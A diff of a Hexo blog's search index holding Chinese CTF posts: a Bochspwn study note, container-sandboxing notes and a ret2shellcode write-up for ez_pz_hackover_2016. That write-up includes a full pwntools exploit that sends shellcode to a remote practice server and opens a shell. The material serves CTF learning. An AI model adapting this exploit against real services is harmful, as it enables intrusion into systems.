-        <tag>内核</tag>
-        <tag>条件竞争</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【babyheap_0ctf_2017】WriteUp</title>
     <url>/posts/d4f04a55.html</url>
-    <content><![CDATA[<h1 id="【babyheap-0ctf-2017】WriteUp"><a href="#【babyheap-0ctf-2017】WriteUp" class="headerlink" title="【babyheap_0ctf_2017】WriteUp"></a>【babyheap_0ctf_2017】WriteUp</h1><p><code>checksec</code>查看，保护全开，可以查看是否有堆的漏洞</p>
+    <content><![CDATA[<p><code>checksec</code>查看，保护全开，可以查看是否有堆的漏洞</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn18/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
 
 <p>ida查看：</p>
@@ -2334,9 +2387,39 @@
       </tags>
   </entry>
   <entry>
+    <title>Bochspwn学习</title>
+    <url>/posts/96f187a0.html</url>
+    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
+<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
+]]></content>
+      <tags>
+        <tag>论文复现</tag>
+        <tag>内核</tag>
+        <tag>条件竞争</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【ez_pz_hackover_2016】WriteUp</title>
+    <url>/posts/478cb6ca.html</url>
+    <content><![CDATA[<p><code>checksec</code>发现NX保护未开启，因此可以考虑Ret2Shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn17/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>ida查看，发现存在栈溢出漏洞，其中n&#x3D;0x400，因此可以尝试向dest中写入shellcode。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0804865D&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26972</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())<span class="comment">#生成shellcode，asm函数是进行汇编</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Yippie, lets crash: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>), <span class="number">16</span>) - <span class="number">0x1c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">shellcode_addr = buf_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;crashme\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>), <span class="number">0x0</span>, shellcode_addr, shellcode)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>Ret2Shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF常用工具汇总</title>
     <url>/posts/81c8e8b2.html</url>
-    <content><![CDATA[<h1 id="CTF常用工具汇总"><a href="#CTF常用工具汇总" class="headerlink" title="CTF常用工具汇总"></a>CTF常用工具汇总</h1><p>记录了ctf的常用工具，随缘更新~</p>
+    <content><![CDATA[<p>记录了ctf的常用工具，随缘更新~</p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>最基础的工具之一，python库</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
 
@@ -2371,34 +2454,10 @@
   <entry>
     <title>SJTU2024回顾</title>
     <url>/posts/6252c524.html</url>
-    <content><![CDATA[<h1 id="SJTU2024回顾"><a href="#SJTU2024回顾" class="headerlink" title="SJTU2024回顾"></a>SJTU2024回顾</h1><p>校赛已经过去两个多月了，一直没有时间回顾。今天复健一下，将校赛的题回顾一遍。本人主打pwn和reverse，回顾内容也主要围绕这些展开。</p>
+    <content><![CDATA[<p>校赛已经过去两个多月了，一直没有时间回顾。今天复健一下，将校赛的题回顾一遍。本人主打pwn和reverse，回顾内容也主要围绕这些展开。</p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2>]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sandboxing</title>
-    <url>/posts/df529e66.html</url>
-    <content><![CDATA[<h1 id="Sandboxing"><a href="#Sandboxing" class="headerlink" title="Sandboxing"></a>Sandboxing</h1><p>观看pwn.college中sandboxing模块的<a href="https://pwn.college/cse466-f2023/sandboxing/">讲解视频</a>所做的笔记</p>
-<h2 id="Modern-Technologies-about-Sandboxing"><a href="#Modern-Technologies-about-Sandboxing" class="headerlink" title="Modern Technologies about Sandboxing"></a>Modern Technologies about Sandboxing</h2><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p>通过设置系统调用的禁用和允许规则来达到目的</p>
-<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><h4 id="创建一个类似于docker的独立命名空间"><a href="#创建一个类似于docker的独立命名空间" class="headerlink" title="创建一个类似于docker的独立命名空间"></a>创建一个类似于docker的独立命名空间</h4><p>unshare命令：Run a program with some namespaces unshared from the parent<br>其创建了一个新的命名空间，其与父进程独立。（注：fork系统调用为完全共享，clone系统调用可以指定共享内容）</p>
-<p>unshare后创建的新进程仍然可以访问原本的目录（如&#x2F;），因为还没有mount和unmount。（附：使用mount将根目录下的目录，例如&#x2F;bin等重新mount到新进程下，就可以在新进程下看到，这就是docker container使用的技巧。注意，在外部系统中是看不到mount的目录的，因为unshare不共享mount namespace）</p>
-<p>mount命令：挂载文件或设备到指定的文件系统<br>其中&#x2F;dev代表挂载的设备文件，&#x2F;sys代表内核相关的内容</p>
-<p>unshare -m -p -n –mount-proc –fork &#x2F;bin&#x2F;bash<br>此命令可以类似于docker创建一个新的进程，进程在一个新的命名空间中，但是仍然可以查看外部文件系统</p>
-<h4 id="创建独立的文件系统"><a href="#创建独立的文件系统" class="headerlink" title="创建独立的文件系统"></a>创建独立的文件系统</h4><p>使用mount将&#x2F;bin等目录挂载到当前目录，并且chroot。<br>但是chroot不安全，因此应该有更安全的方法：使用命名空间pivot_root</p>
-<p>使用pivot_root，先创建一个old文件夹存放根目录，然后unmount，rmdir。即可实现容器化。</p>
-<p>docker额外实现的机制：</p>
-<ul>
-<li>docker还另外实现了对资源的限制，例如内存用量，使用ulimit命令</li>
-<li>对用户的限制，使在容器内为root，但在容器外为普通用户</li>
-<li>seccomp限制特定命令，例如unshare，避免其逃逸</li>
-</ul>
-<p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Sandbox</tag>
       </tags>
   </entry>
   <entry>
@@ -2418,5 +2477,29 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Sandboxing</title>
+    <url>/posts/df529e66.html</url>
+    <content><![CDATA[<p>观看pwn.college中sandboxing模块的<a href="https://pwn.college/cse466-f2023/sandboxing/">讲解视频</a>所做的笔记</p>
+<h2 id="Modern-Technologies-about-Sandboxing"><a href="#Modern-Technologies-about-Sandboxing" class="headerlink" title="Modern Technologies about Sandboxing"></a>Modern Technologies about Sandboxing</h2><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p>通过设置系统调用的禁用和允许规则来达到目的</p>
+<h3 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h3><h4 id="创建一个类似于docker的独立命名空间"><a href="#创建一个类似于docker的独立命名空间" class="headerlink" title="创建一个类似于docker的独立命名空间"></a>创建一个类似于docker的独立命名空间</h4><p>unshare命令：Run a program with some namespaces unshared from the parent<br>其创建了一个新的命名空间，其与父进程独立。（注：fork系统调用为完全共享，clone系统调用可以指定共享内容）</p>
+<p>unshare后创建的新进程仍然可以访问原本的目录（如&#x2F;），因为还没有mount和unmount。（附：使用mount将根目录下的目录，例如&#x2F;bin等重新mount到新进程下，就可以在新进程下看到，这就是docker container使用的技巧。注意，在外部系统中是看不到mount的目录的，因为unshare不共享mount namespace）</p>
+<p>mount命令：挂载文件或设备到指定的文件系统<br>其中&#x2F;dev代表挂载的设备文件，&#x2F;sys代表内核相关的内容</p>
+<p>unshare -m -p -n –mount-proc –fork &#x2F;bin&#x2F;bash<br>此命令可以类似于docker创建一个新的进程，进程在一个新的命名空间中，但是仍然可以查看外部文件系统</p>
+<h4 id="创建独立的文件系统"><a href="#创建独立的文件系统" class="headerlink" title="创建独立的文件系统"></a>创建独立的文件系统</h4><p>使用mount将&#x2F;bin等目录挂载到当前目录，并且chroot。<br>但是chroot不安全，因此应该有更安全的方法：使用命名空间pivot_root</p>
+<p>使用pivot_root，先创建一个old文件夹存放根目录，然后unmount，rmdir。即可实现容器化。</p>
+<p>docker额外实现的机制：</p>
+<ul>
+<li>docker还另外实现了对资源的限制，例如内存用量，使用ulimit命令</li>
+<li>对用户的限制，使在容器内为root，但在容器外为普通用户</li>
+<li>seccomp限制特定命令，例如unshare，避免其逃逸</li>
+</ul>
+<p>可以使用nsenter从外部进入已有命名空间eg：nsenter –mount&#x3D;&#x2F;proc&#x2F;xxxx&#x2F;ns&#x2F;mnt [file]<br>(与setns系统调用有关)</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Sandbox</tag>
+      </tags>
   </entry>
 </search>
